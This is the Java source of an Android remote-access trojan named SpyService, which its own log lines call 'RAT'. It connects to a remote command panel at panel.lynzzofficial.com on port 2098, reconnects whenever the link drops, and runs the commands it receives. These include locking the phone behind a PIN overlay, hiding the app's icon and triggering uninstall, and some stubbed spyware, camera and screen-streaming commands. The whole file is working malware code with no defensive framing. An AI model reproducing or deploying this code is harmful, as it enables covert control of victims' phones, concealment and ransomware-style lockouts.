package com.nullx.pp;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import android.net.Uri;
import java.io.DataOutputStream;
import java.net.Socket;

public class SpyService extends Service implements LocationListener {
    private Socket socket;
    private DataOutputStream output;
    private final String DOMAIN = "panel.lynzzofficial.com";
    private final int PORT = 2098;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        connectToPanel();
        return START_STICKY;
    }

    private void connectToPanel() {
        new Thread(() -> {
            try {
                socket = new Socket(DOMAIN, PORT);
                output = new DataOutputStream(socket.getOutputStream());
                Log.d("RAT", "✅ Connected");
                listenForCommands();
            } catch (Exception e) {
                Log.e("RAT", "Connection failed", e);
                try { Thread.sleep(5000); } catch (Exception ex) {}
                connectToPanel();
            }
        }).start();
    }

    private void listenForCommands() {
        try {
            java.io.InputStream input = socket.getInputStream();
            byte[] buffer = new byte[1024];
            int bytes;
            while (true) {
                bytes = input.read(buffer);
                if (bytes > 0) {
                    String cmd = new String(buffer, 0, bytes).trim();
                    handleCommand(cmd);
                }
            }
        } catch (Exception e) {
            Log.e("RAT", "Lost connection", e);
            connectToPanel();
        }
    }

    private void handleCommand(String cmd) {
        Log.d("RAT", "Command: " + cmd);
        if (cmd.startsWith("LOCK_PIN:")) {
            String pin = cmd.substring(9);
            LockOverlayService.lockDevice(this, pin);
            sendResponse("Locked with PIN " + pin);
        } else if (cmd.equals("UNLOCK")) {
            LockOverlayService.removeOverlay(this);
            sendResponse("Unlocked");
        } else if (cmd.equals("SPYWARE_ON")) {
            sendResponse("Spyware ON (simulated)");
        } else if (cmd.equals("SPYWARE_OFF")) {
            sendResponse("Spyware OFF");
        } else if (cmd.equals("LIVE_CAM")) {
            sendResponse("Cam started");
        } else if (cmd.equals("LIVE_SCREEN")) {
            sendResponse("Screen started");
        } else if (cmd.equals("STREAM_STOP")) {
            sendResponse("Stream stopped");
        } else if (cmd.equals("HAPUS")) {
            uninstallApp();
        } else if (cmd.equals("HILANG")) {
            hideAppIcon();
        } else if (cmd.equals("MUNCUL")) {
            showAppIcon();
        } else {
            sendResponse("Unknown command");
        }
    }

    private void uninstallApp() {
        try {
            Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendResponse("Uninstall dialog opened");
        } catch (Exception e) { sendResponse("Uninstall failed"); }
    }

    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            android.content.ComponentName cn = new android.content.ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            sendResponse("Icon hidden");
        } catch (Exception e) { sendResponse("Hide failed"); }
    }

    private void showAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            android.content.ComponentName cn = new android.content.ComponentName(this, MainActivity.class);
            pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            sendResponse("Icon shown");
        } catch (Exception e) { sendResponse("Show failed"); }
    }

    private void sendResponse(String msg) {
        try { output.writeBytes(msg + "\n"); output.flush(); } catch (Exception e) {}
    }

    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onLocationChanged(Location location) {}
    @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
    @Override public void onProviderEnabled(String provider) {}
    @Override public void onProviderDisabled(String provider) {}
}